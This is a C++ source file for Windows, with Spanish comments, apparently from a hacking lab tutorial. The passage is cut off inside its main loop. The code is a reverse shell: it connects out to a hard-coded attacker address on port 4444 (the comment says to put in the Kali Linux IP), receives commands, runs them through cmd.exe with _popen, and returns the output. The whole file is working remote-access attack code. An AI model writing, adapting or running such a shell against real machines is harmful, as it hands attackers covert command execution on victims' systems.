#include <iostream>

#include <winsock2.h>

#include <string>

#include <array>

#include <memory>



#pragma comment(lib, "ws2_32.lib")



// Esta es la función mágica que ejecuta el comando en el sistema operativo

std::string ejecutarComando(const char* cmd) {

    std::array<char, 128> buffer;

    std::string resultado;

    

    // _popen abre una tubería oculta con la consola de Windows (cmd.exe)

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);

    if (!pipe) {

        return "Error al ejecutar el comando.\n";

    }

    

    // Leemos el resultado y lo guardamos

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {

        resultado += buffer.data();

    }

    return resultado;

}



int main() {

    WSADATA wsaData;

    SOCKET sock;

    struct sockaddr_in serv_addr;

    char buffer[4096] = {0};



    WSAStartup(MAKEWORD(2,2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, 0);



    serv_addr.sin_family = AF_INET;

    serv_addr.sin_port = htons(4444);

    

    // PON AQUÍ LA IP DE TU KALI LINUX

    serv_addr.sin_addr.s_addr = inet_addr("10.0.2.15"); 



    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {

        return -1;

    }



    while (true) {

        memset(buffer, 0, 4096);

        int valread = recv(sock, buffer, 4096, 0);

        if (valread <= 0) break;



        // Aquí cambiamos el código: en vez de hacer eco, llamamos a la función de arriba

        std::string comando(buffer);

        std::string respuesta = ejecutarComando(comando.c_str());

        

        // Si el comando no devuelve texto (como crear una carpeta), enviamos esto:

        if(respuesta.empty()){

            respuesta = "Comando ejecutado sin salida de texto.\n";
